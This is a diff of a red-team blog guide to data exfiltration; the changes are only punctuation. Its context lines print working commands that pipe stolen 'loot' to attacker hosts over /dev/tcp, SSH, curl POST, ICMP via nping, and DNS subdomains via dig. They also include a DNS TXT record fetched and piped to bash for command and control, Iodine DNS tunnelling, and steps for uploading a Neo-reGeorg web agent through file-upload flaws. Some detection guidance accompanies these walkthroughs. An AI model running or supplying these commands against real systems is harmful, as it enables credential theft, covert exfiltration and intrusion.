@@ -17,22 +17,22 @@ tags:
   - "opsec"
   - "penetration-testing"
 severity: "High"
-excerpt: "A comprehensive red-team reference covering data exfiltration techniques across TCP, SSH, HTTP/HTTPS, ICMP, and DNS — including advanced IP-over-DNS tunneling with Iodine and HTTP tunneling with Neo-reGeorg — with operational security notes and detection guidance for each method."
+excerpt: "A comprehensive red-team reference covering data exfiltration techniques across TCP, SSH, HTTP/HTTPS, ICMP, and DNS - including advanced IP-over-DNS tunneling with Iodine and HTTP tunneling with Neo-reGeorg - with operational security notes and detection guidance for each method."
 readTime: "35 min"
 url: "https://asbawy.com/logs/data-exfiltration-guide"
 ---
 
 ![Data exfiltration attack paths across TCP, SSH, HTTP, ICMP, and DNS](https://i.imgur.com/lpX6GkI.png)
 
-Data exfiltration is the unauthorized transfer of sensitive information from a compromised environment to attacker-controlled infrastructure. This guide walks through practical red-team techniques across TCP, SSH, HTTP/HTTPS, ICMP, and DNS — including Iodine (IP-over-DNS) and Neo-reGeorg (HTTP tunneling) — with operational security notes and blue-team detection guidance for each method.
+Data exfiltration is the unauthorized transfer of sensitive information from a compromised environment to attacker-controlled infrastructure. This guide walks through practical red-team techniques across TCP, SSH, HTTP/HTTPS, ICMP, and DNS - including Iodine (IP-over-DNS) and Neo-reGeorg (HTTP tunneling) - with operational security notes and blue-team detection guidance for each method.
 
 ## 01 · Introduction to Data Exfiltration
 
 ### 1.1 Modern Threat Landscape
 
-Data exfiltration is the unauthorized transfer of sensitive data from a compromised network to attacker-controlled infrastructure. In contemporary threat operations, exfiltration is rarely a loud, obvious event. Instead, sophisticated actors blend their traffic into the enormous volume of legitimate network communications — DNS queries, HTTP requests, ICMP pings — exploiting protocols that organizations depend on and therefore cannot simply block.
+Data exfiltration is the unauthorized transfer of sensitive data from a compromised network to attacker-controlled infrastructure. In contemporary threat operations, exfiltration is rarely a loud, obvious event. Instead, sophisticated actors blend their traffic into the enormous volume of legitimate network communications - DNS queries, HTTP requests, ICMP pings - exploiting protocols that organizations depend on and therefore cannot simply block.
 
-Historically, perimeter firewalls were the primary defense. Attackers responded by pivoting to protocols firewalls are reluctant to block: DNS (port 53), HTTP/HTTPS (ports 80/443), and ICMP — all of which are essential to normal business operations. This asymmetry between network necessity and security risk defines the modern data exfiltration problem.
+Historically, perimeter firewalls were the primary defense. Attackers responded by pivoting to protocols firewalls are reluctant to block: DNS (port 53), HTTP/HTTPS (ports 80/443), and ICMP - all of which are essential to normal business operations. This asymmetry between network necessity and security risk defines the modern data exfiltration problem.
 
 From a red team perspective, exfiltration technique selection is driven by the target environment's firewall posture, available egress paths, monitoring capabilities, and the volume of data to be transferred. Understanding protocol-specific trade-offs is essential for operating at the highest level of stealth and effectiveness.
 
@@ -40,7 +40,7 @@ From a red team perspective, exfiltration technique selection is driven by the t
 
 | Property            | Description                                                                                                     |
 | ------------------- | --------------------------------------------------------------------------------------------------------------- |
-| Stealthy Transfer   | Data is copied — not moved — from target systems, minimizing immediate forensic evidence                        |
+| Stealthy Transfer   | Data is copied - not moved - from target systems, minimizing immediate forensic evidence                        |
 | Protocol Abuse      | Legitimate network protocols carry malicious payloads, making traffic blend with normal activity                |
 | Detection Challenge | Security tools calibrated for known attack signatures often miss protocol-level exfiltration                    |
 | Firewall Bypass     | Protocols not designed for data transfer (ICMP, DNS) frequently pass through controls unchallenged              |
@@ -48,10 +48,10 @@ From a red team perspective, exfiltration technique selection is driven by the t
 
 ### 1.3 Commonly Abused Protocols
 
-- DNS (Domain Name System) — port 53 UDP/TCP
-- HTTP/HTTPS (Hypertext Transfer Protocol) — ports 80 and 443
-- SSH (Secure Shell) — port 22
-- ICMP (Internet Control Message Protocol) — Layer 3, no port
+- DNS (Domain Name System) - port 53 UDP/TCP
+- HTTP/HTTPS (Hypertext Transfer Protocol) - ports 80 and 443
+- SSH (Secure Shell) - port 22
+- ICMP (Internet Control Message Protocol) - Layer 3, no port
 
 ---
 
@@ -68,7 +68,7 @@ From a red team perspective, exfiltration technique selection is driven by the t
 
 ---
 
-## 03 · Layer 4 — TCP Socket Exfiltration
+## 03 · Layer 4 - TCP Socket Exfiltration
 
 ### 3.1 Concept and Operational Rationale
 
@@ -80,19 +80,19 @@ Data is typically encoded using Base64 and further obfuscated with EBCDIC conver
 
 ### 3.2 Execution Walkthrough
 
-#### Step 1 — Start a Listener on Attacker Infrastructure
+#### Step 1 - Start a Listener on Attacker Infrastructure
 
 ```bash
 asbawy@kali$ nc -lvp 8080 > /tmp/exfil-creds.data
 # Listening on [0.0.0.0] (family 0, port 8080)
 ```
 
-- `-l` — listen mode
-- `-v` — verbose output
-- `-p 8080` — bind on port 8080
-- `>` — redirect incoming stream to file
+- `-l` - listen mode
+- `-v` - verbose output
+- `-p 8080` - bind on port 8080
+- `>` - redirect incoming stream to file
 
-#### Step 2 — Access the Compromised Host
+#### Step 2 - Access the Compromised Host
 
 ```bash
 asbawy@kali$ ssh test@internal.corp
@@ -105,7 +105,7 @@ asbawy@kali$ ssh test@10.10.10.50 -p 2022
 # Credentials: cred:cred
 ```
 
-#### Step 3 — Inspect Target Data on Victim
+#### Step 3 - Inspect Target Data on Victim
 
 ```bash
 test@victim:~$ cat loot/creds.txt
@@ -114,7 +114,7 @@ Admin:123456
 root:manga
 ```
 
-#### Step 4 — Compress, Encode, and Exfiltrate via TCP
+#### Step 4 - Compress, Encode, and Exfiltrate via TCP
 
 ```bash
 test@victim:~$ tar zcf - loot/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.1.100/8080
@@ -134,7 +134,7 @@ test@victim:~$ tar zcf - loot/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.1.10
 
 **Why Base64 + EBCDIC?** The Base64 encoding produces a safe, printable character set. The subsequent EBCDIC conversion renders the traffic non-human-readable and defeats naive signature matching on the wire without requiring any external encryption tool.
 
-#### Step 5 — Verify Receipt and Restore Data
+#### Step 5 - Verify Receipt and Restore Data
 
 ```bash
 # On attacker machine: confirm receipt
@@ -176,7 +176,7 @@ asbawy@kali$ cat loot/creds.txt
 
 ---
 
-## 04 · Layer 7 — SSH Exfiltration
+## 04 · Layer 7 - SSH Exfiltration
 
 ### 4.1 Concept and Operational Rationale
 
@@ -186,7 +186,7 @@ From a network perspective, SSH exfiltration traffic is structurally identical t
 
 ### 4.2 Execution Walkthrough
 
-#### Step 1 — Inspect Target Data on Victim
+#### Step 1 - Inspect Target Data on Victim
 
 ```bash
 test@victim:~$ cat loot/creds.txt
@@ -195,7 +195,7 @@ Admin:123456
 root:manga
 ```
 
-#### Step 2 — Stream and Extract Data via SSH
+#### Step 2 - Stream and Extract Data via SSH
 
 ```bash
 test@victim:~$ tar cf - loot/ | ssh test@c2.infrastructure.io "cd /tmp/ && tar xpf -"
@@ -209,7 +209,7 @@ test@victim:~$ tar cf - loot/ | ssh test@c2.infrastructure.io "cd /tmp/ && tar x
 | Encrypted Transport | `pipe ssh test@c2.infrastructure.io` | SSH encrypts the entire stream in transit                        |
 | Remote Extraction   | `"cd /tmp/ && tar xpf -"`            | Executed on attacker server; unpacks the stream directly to disk |
 
-#### Step 3 — Verify Data Received on Attacker Server
+#### Step 3 - Verify Data Received on Attacker Server
 
 ```bash
 asbawy@kali:/tmp/loot$ cat creds.txt
@@ -272,7 +272,7 @@ tar cf - loot/ | base64 | ssh test@c2.infrastructure.io "cd /tmp/ && base64 -d |
 
 ---
 
-## 05 · Layer 7 — HTTP/HTTPS Exfiltration
+## 05 · Layer 7 - HTTP/HTTPS Exfiltration
 
 ### 5.1 Concept and Operational Rationale
 
@@ -283,16 +283,16 @@ The key technical choice is HTTP POST over HTTP GET. POST parameters are not rec
 **Access Log Comparison:**
 
 ```
-# GET — parameter visible in log (poor opsec)
+# GET - parameter visible in log (poor opsec)
 10.10.5.20 - - [22/Apr/2026:12:03:11 +0100] "GET /upload.php?file=dGVzdDp0ZXN0Cg== HTTP/1.1" 200 147
 
-# POST — no data visible in log (correct approach)
+# POST - no data visible in log (correct approach)
 10.10.5.20 - - [22/Apr/2026:12:03:25 +0100] "POST /upload.php HTTP/1.1" 200 147
 ```
 
-### 5.2 HTTP POST Exfiltration — Execution Walkthrough
+### 5.2 HTTP POST Exfiltration - Execution Walkthrough
 
-#### Step 1 — Deploy a Receiving Handler on Attacker Web Server
+#### Step 1 - Deploy a Receiving Handler on Attacker Web Server
 
 Save the following as `contact.php` on the attacker-controlled web server:
 
@@ -308,13 +308,13 @@ if (isset($_POST['file'])) {
 
 This handler accepts a POST parameter named `file` and writes the raw content to disk.
 
-#### Step 2 — Access the Compromised Victim Host
+#### Step 2 - Access the Compromised Victim Host
 
 ```bash
 asbawy@kali$ ssh test@internal.corp
 ```
 
-#### Step 3 — Compress, Encode, and POST Data
+#### Step 3 - Compress, Encode, and POST Data
 
 ```bash
 test@victim:~$ curl --data "file=$(tar zcf - loot/ | base64)" http://webserver.local/contact.php
@@ -328,7 +328,7 @@ test@victim:~$ curl --data "file=$(tar zcf - loot/ | base64)" http://webserver.l
 | Encode   | `pipe base64`            | Converts binary data to HTTP-safe ASCII  |
 | Transmit | `curl --data "file=..."` | HTTP POST to attacker web server handler |
 
-#### Step 4 — Retrieve and Restore Data on Attacker Server
+#### Step 4 - Retrieve and Restore Data on Attacker Server
 
 ```bash
 # Connect to attacker web server
@@ -378,11 +378,11 @@ HTTPS exfiltration renders wire-level content inspection impossible without SSL/
 
 ---
 
-## 06 · Layer 3 — ICMP Exfiltration
+## 06 · Layer 3 - ICMP Exfiltration
 
 ### 6.1 Concept and Operational Rationale
 
-ICMP (Internet Control Message Protocol) is a network-layer diagnostic protocol. Its most familiar manifestation is the `ping` command (Echo Request / Echo Reply). ICMP carries a Data section in each packet — a field intended to carry error diagnostic information — but there is no technical constraint preventing this field from containing arbitrary attacker-controlled data.
+ICMP (Internet Control Message Protocol) is a network-layer diagnostic protocol. Its most familiar manifestation is the `ping` command (Echo Request / Echo Reply). ICMP carries a Data section in each packet - a field intended to carry error diagnostic information - but there is no technical constraint preventing this field from containing arbitrary attacker-controlled data.
 
 ICMP exfiltration is particularly effective because:
 
@@ -400,7 +400,7 @@ The primary limitation is bandwidth. Each ICMP packet's data section is constrai
 | Code             | 8 bits   | Subtype for the ICMP message                    |
 | Checksum         | 16 bits  | Error-detection field                           |
 | Header Remainder | 32 bits  | Varies by ICMP type (ID + Sequence for Echo)    |
-| Data             | Variable | Arbitrary payload — the exfiltration vector     |
+| Data             | Variable | Arbitrary payload - the exfiltration vector     |
 
 ### 6.3 Manual ICMP Exfiltration via ping
 
@@ -425,7 +425,7 @@ The receiving party captures this packet with `tcpdump` or Wireshark and extract
 
 Metasploit's `auxiliary/server/icmp_exfil` module automates multi-packet ICMP exfiltration with BOF (Beginning of File) and EOF (End of File) delimiters, handling chunking and reassembly automatically.
 
-#### Step 1 — Configure and Launch the Listener
+#### Step 1 - Configure and Launch the Listener
 
 ```bash
 msf6 > use auxiliary/server/icmp_exfil
@@ -435,10 +435,10 @@ msf6 auxiliary(server/icmp_exfil) > run
 # [*] ICMP Listener started on eth0. Monitoring for trigger packet containing ^BOF
 ```
 
-- `BPF_FILTER` — excludes the attacker's own IP to prevent capture loops
-- `INTERFACE` — the network interface on which to listen
+- `BPF_FILTER` - excludes the attacker's own IP to prevent capture loops
+- `INTERFACE` - the network interface on which to listen
 
-#### Step 2 — Send BOF Trigger from Victim
+#### Step 2 - Send BOF Trigger from Victim
 
 ```bash
 test@victim:~$ sudo nping --icmp -c 1 10.10.10.100 --data-string "BOFcreds.txt"
@@ -446,14 +446,14 @@ test@victim:~$ sudo nping --icmp -c 1 10.10.10.100 --data-string "BOFcreds.txt"
 
 This tells the Metasploit listener to expect a file named `creds.txt` and begin capturing subsequent ICMP data.
 
-#### Step 3 — Transmit Data Chunks
+#### Step 3 - Transmit Data Chunks
 
 ```bash
 test@victim:~$ sudo nping --icmp -c 1 10.10.10.100 --data-string "admin:password"
 test@victim:~$ sudo nping --icmp -c 1 10.10.10.100 --data-string "root:manga"
 ```
 
-#### Step 4 — Send EOF Trigger
+#### Step 4 - Send EOF Trigger
 
 ```bash
 test@victim:~$ sudo nping --icmp -c 1 10.10.10.100 --data-string "EOF"
@@ -503,7 +503,7 @@ asbawy@kali$ sudo tcpdump -i eth0 icmp
 
 - Match the frequency and packet size of ICMP traffic to the environment's existing ping baseline (e.g., monitoring systems performing periodic health checks).
 - Randomize inter-packet timing to prevent detection by regularity-based ICMP anomaly detectors.
-- Encrypt payload data before inserting it into the ICMP Data field — a raw credential string in the Data field is trivially detected by any packet capture.
+- Encrypt payload data before inserting it into the ICMP Data field - a raw credential string in the Data field is trivially detected by any packet capture.
 - Use ICMPDoor and similar tools sparingly; their signatures (specific ICMP type/code combinations with non-zero data sections) are increasingly present in security tool signature databases.
 
 ### 6.7 Mitigation and Detection
@@ -519,13 +519,13 @@ asbawy@kali$ sudo tcpdump -i eth0 icmp
 
 ---
 
-## 07 · Layer 7 — DNS Exfiltration
+## 07 · Layer 7 - DNS Exfiltration
 
 ### 7.1 Concept and Operational Rationale
 
 DNS (Domain Name System) is arguably the most abusable protocol for exfiltration due to one fundamental reality: blocking DNS breaks the internet. Every organization must permit DNS traffic (port 53 UDP/TCP) to function, and many organizations fail to inspect DNS query payloads with any rigor.
 
-DNS exfiltration encodes sensitive data into DNS query strings — specifically, as subdomains of an attacker-controlled domain. Because the attacker controls an authoritative nameserver for their domain, all DNS queries for `*.attacker-domain.com` are delivered to that server, containing the encoded data payload in the subdomain labels.
+DNS exfiltration encodes sensitive data into DNS query strings - specifically, as subdomains of an attacker-controlled domain. Because the attacker controls an authoritative nameserver for their domain, all DNS queries for `*.attacker-domain.com` are delivered to that server, containing the encoded data payload in the subdomain labels.
 
 ### 7.2 DNS Record Types Relevant to Exfiltration
 
@@ -548,7 +548,7 @@ DNS exfiltration encodes sensitive data into DNS query strings — specifically,
 
 ### 7.4 DNS Exfiltration Execution Walkthrough
 
-#### Step 1 — Prepare Attacker Machine to Receive DNS Traffic
+#### Step 1 - Prepare Attacker Machine to Receive DNS Traffic
 
 ```bash
 asbawy@kali$ sudo tcpdump -i eth0 udp port 53 -v
@@ -556,7 +556,7 @@ asbawy@kali$ sudo tcpdump -i eth0 udp port 53 -v
 
 This captures all incoming DNS queries, which will contain the exfiltrated data in the subdomain fields.
 
-#### Step 2 — Identify Target Data on Victim
+#### Step 2 - Identify Target Data on Victim
 
 ```bash
 test@victim:~$ cat loot/credit.txt
@@ -567,7 +567,7 @@ Expire: 12/26
 Code: 772
 ```
 
-#### Step 3 — Encode Data with Base64
+#### Step 3 - Encode Data with Base64
 
 ```bash
 test@victim:~$ cat loot/credit.txt | base64
@@ -575,7 +575,7 @@ VGVzdCBVc2VyCkFkZHJlc3M6IDEyMzQgQ29ycG9yYXRlIEF2ZQpDcmVkaXQgQ2FyZDogNDExMS0x
 MTExLTExMTEtMTExMQpFeHBpcmU6IDEyLzI2CkNvZGU6IDc3Mgo=
 ```
 
-#### Step 4 — Method A — Multiple Individual DNS Queries
+#### Step 4 - Method A - Multiple Individual DNS Queries
 
 Each chunk of the encoded data is sent as a separate DNS query:
 
@@ -597,7 +597,7 @@ Q29ycG9yYXRlIEF2.c2.infrastructure.io
 | Chunk          | `fold -w18`                             | Splits into 18-character labels (well under 63-char limit) |
 | Format         | `sed -r 's/.*/&.c2.infrastructure.io/'` | Appends attacker nameserver to each chunk                  |
 
-#### Step 5 — Method B — Single DNS Request (Recommended)
+#### Step 5 - Method B - Single DNS Request (Recommended)
 
 Combines all chunks into one DNS query by chaining labels:
 
@@ -608,7 +608,7 @@ test@victim:~$ cat loot/credit.txt | base64 | tr -d "\n" | fold -w18 \
 VGVzdCBVc2VyCkFk.ZHJlc3M6IDEyMzQg.Q29ycG9yYXRlIEF2.(...).c2.infrastructure.io
 ```
 
-#### Step 6 — Execute the DNS Query
+#### Step 6 - Execute the DNS Query
 
 ```bash
 test@victim:~$ cat loot/credit.txt | base64 | tr -d "\n" | fold -w18 \
@@ -618,7 +618,7 @@ test@victim:~$ cat loot/credit.txt | base64 | tr -d "\n" | fold -w18 \
 
 The `dig` command sends the constructed subdomain as a DNS A query. The attacker's authoritative nameserver receives the full query string and logs it.
 
-#### Step 7 — Reconstruct Data on Attacker Server
+#### Step 7 - Reconstruct Data on Attacker Server
 
 Captured query from `tcpdump`:
 
@@ -643,7 +643,7 @@ Code: 772
 
 Attackers can deliver commands to compromised hosts using DNS TXT records, creating a fully DNS-encapsulated C2 channel.
 
-**Step 1 — Encode command as Base64:**
+**Step 1 - Encode command as Base64:**
 
 ```bash
 asbawy@kali$ echo '#!/bin/bash
@@ -651,9 +651,9 @@ ping -c 1 internal.corp' | base64
 IyEvYmluL2Jhc2gKcGluZyAtYyAxIGludGVybmFsLmNvcnAK
 ```
 
-**Step 2 — Create a DNS TXT record** for `cmd.c2.infrastructure.io` containing the Base64 payload (via attacker DNS management panel).
+**Step 2 - Create a DNS TXT record** for `cmd.c2.infrastructure.io` containing the Base64 payload (via attacker DNS management panel).
 
-**Step 3 — Victim retrieves and executes the command:**
+**Step 3 - Victim retrieves and executes the command:**
 
 ```bash
 test@victim:~$ dig +short -t TXT cmd.c2.infrastructure.io | tr -d '"' | base64 -d | bash
@@ -691,11 +691,11 @@ This pattern enables fully network-agnostic C2: as long as the victim can resolv
 
 ---
 
-## 08 · Advanced Tunneling — Iodine (IP-over-DNS)
+## 08 · Advanced Tunneling - Iodine (IP-over-DNS)
 
 ### 8.1 Concept and Operational Rationale
 
-DNS tunneling with Iodine goes beyond simple data exfiltration — it creates a full bidirectional IP tunnel over DNS, enabling TCP connections, SSH, HTTP browsing, and arbitrary network pivoting through a DNS channel. This is the technique of last resort in maximally restricted environments: if a host can resolve DNS, Iodine can establish a full IP tunnel to attacker infrastructure.
+DNS tunneling with Iodine goes beyond simple data exfiltration - it creates a full bidirectional IP tunnel over DNS, enabling TCP connections, SSH, HTTP browsing, and arbitrary network pivoting through a DNS channel. This is the technique of last resort in maximally restricted environments: if a host can resolve DNS, Iodine can establish a full IP tunnel to attacker infrastructure.
 
 Iodine encapsulates IP packets inside DNS queries and responses. The attacker runs `iodined` (server daemon) on a machine authoritative for a registered domain. The victim runs `iodine` (client), which creates a virtual `dns0` network interface and routes traffic through DNS.
 
@@ -726,11 +726,11 @@ Attacker Infrastructure / Internal Network Access
 
 ### 8.4 Execution Walkthrough
 
-#### Step 1 — Configure DNS Records
+#### Step 1 - Configure DNS Records
 
 Point the NS record of a subdomain to your attacker server's IP address. For this example, `tunnel.c2.infrastructure.io` is configured with an NS record pointing to `172.20.0.200` (attacker machine).
 
-#### Step 2 — Start the Iodine Server (Attacker Machine)
+#### Step 2 - Start the Iodine Server (Attacker Machine)
 
 ```bash
 asbawy@kali$ sudo iodined -f -c -P s3cr3tpass 10.1.1.1/24 tunnel.c2.infrastructure.io
@@ -754,7 +754,7 @@ Opened IPv4 UDP socket
 Listening to dns for domain tunnel.c2.infrastructure.io
 ```
 
-#### Step 3 — Start the Iodine Client (Victim / Jumpbox)
+#### Step 3 - Start the Iodine Client (Victim / Jumpbox)
 
 ```bash
 test@victim:~$ sudo iodine -P s3cr3tpass tunnel.c2.infrastructure.io
@@ -780,7 +780,7 @@ Connection setup complete, transmitting data.
 
 The tunnel is now live. `dns0` on the victim carries the IP address `10.1.1.2`; `dns0` on the server carries `10.1.1.1`.
 
-#### Step 4 — Establish an SSH SOCKS Proxy Over the DNS Tunnel
+#### Step 4 - Establish an SSH SOCKS Proxy Over the DNS Tunnel
 
 Once the IP tunnel is established, layer an SSH SOCKS proxy on top for full pivoting capability:
 
@@ -796,7 +796,7 @@ asbawy@kali$ ssh test@10.1.1.2 -4 -f -N -D 1080
 | `-N`       | Do not execute a remote command; port-forward only |
 | `-D 1080`  | Create a SOCKS5 proxy on localhost port 1080       |
 
-#### Step 5 — Pivot Through the Tunnel
+#### Step 5 - Pivot Through the Tunnel
 
 Access internal network resources via the SOCKS proxy:
 
@@ -810,7 +810,7 @@ asbawy@kali$ curl --socks5 127.0.0.1:1080 http://172.20.0.50/api/internal
 
 From the internal server's perspective, all traffic originates from the victim host, not the attacker's real IP.
 
-#### Step 6 — Monitor DNS Tunnel Traffic (Optional Validation)
+#### Step 6 - Monitor DNS Tunnel Traffic (Optional Validation)
 
 ```bash
 asbawy@kali$ sudo tcpdump -i eth0 udp port 53 -v
@@ -850,11 +850,11 @@ Iodine auto-negotiates the best available record type at connection time.
 
 ---
 
-## 09 · Advanced Tunneling — Neo-reGeorg (HTTP Tunneling)
+## 09 · Advanced Tunneling - Neo-reGeorg (HTTP Tunneling)
 
 ### 9.1 Concept and Operational Rationale
 
-Neo-reGeorg creates a full SOCKS proxy tunnel delivered through HTTP requests to a server-side agent script (PHP, ASPX, JSP). It is designed for scenarios where a web application is accessible from the internet but internal network resources are not — Neo-reGeorg enables pivoting from the attacker through the public-facing web server and into the internal network, with all traffic appearing as ordinary HTTP requests to a web application.
+Neo-reGeorg creates a full SOCKS proxy tunnel delivered through HTTP requests to a server-side agent script (PHP, ASPX, JSP). It is designed for scenarios where a web application is accessible from the internet but internal network resources are not - Neo-reGeorg enables pivoting from the attacker through the public-facing web server and into the internal network, with all traffic appearing as ordinary HTTP requests to a web application.
 
 ### 9.2 Architecture Overview
 
@@ -876,7 +876,7 @@ Internal Network Resources (app.internal.corp, db.internal.corp)
 
 ### 9.3 Execution Walkthrough
 
-#### Step 1 — Generate an Encrypted Tunnel Agent
+#### Step 1 - Generate an Encrypted Tunnel Agent
 
 ```bash
 asbawy@kali$ python3 neoreg.py generate -k 0p3r4t10nk3y
@@ -884,13 +884,13 @@ asbawy@kali$ python3 neoreg.py generate -k 0p3r4t10nk3y
 
 This produces encrypted agent scripts in `neoreg_servers/`:
 
-- `tunnel.php` — for PHP-enabled web servers
-- `tunnel.aspx` — for ASP.NET / IIS servers
-- `tunnel.jsp` — for Java application servers
+- `tunnel.php` - for PHP-enabled web servers
+- `tunnel.aspx` - for ASP.NET / IIS servers
+- `tunnel.jsp` - for Java application servers
 
 The `-k` flag sets the encryption key. All traffic between the client and agent is encrypted using this key.
 
-#### Step 2 — Deploy Agent to Target Web Server
+#### Step 2 - Deploy Agent to Target Web Server
 
 Upload `tunnel.php` to the target web server via any available upload mechanism (file upload vulnerability, CMS media upload, LFI, etc.).
 
@@ -900,7 +900,7 @@ The deployed agent is accessible at:
 http://webserver.local/uploads/tunnel.php
 ```
 
-#### Step 3 — Establish the HTTP Tunnel
+#### Step 3 - Establish the HTTP Tunnel
 
 ```bash
 asbawy@kali$ python3 neoreg.py -k 0p3r4t10nk3y -u http://webserver.local/uploads/tunnel.php
@@ -908,7 +908,7 @@ asbawy@kali$ python3 neoreg.py -k 0p3r4t10nk3y -u http://webserver.local/uploads
 
 On successful connection, Neo-reGeorg binds a SOCKS5 proxy at `127.0.0.1:1080`.
 
-#### Step 4 — Access Internal Network Resources via the Tunnel
+#### Step 4 - Access Internal Network Resources via the Tunnel
 
 ```bash
 # Access an internal application server
@@ -927,7 +927,7 @@ asbawy@kali$ curl --socks5 127.0.0.1:1080 http://db.internal.corp:8080/admin
 | 3    | webserver.local → app.internal.corp         | Web server opens internal TCP connection on attacker's behalf |
 | 4    | Reverse path                                | Responses flow back through same chain                        |
 
-From the internal application's perspective, all traffic originates from the web server's IP — not the attacker.
+From the internal application's perspective, all traffic originates from the web server's IP - not the attacker.
 
 ### 9.5 Operational Security (OpSec) Notes
 
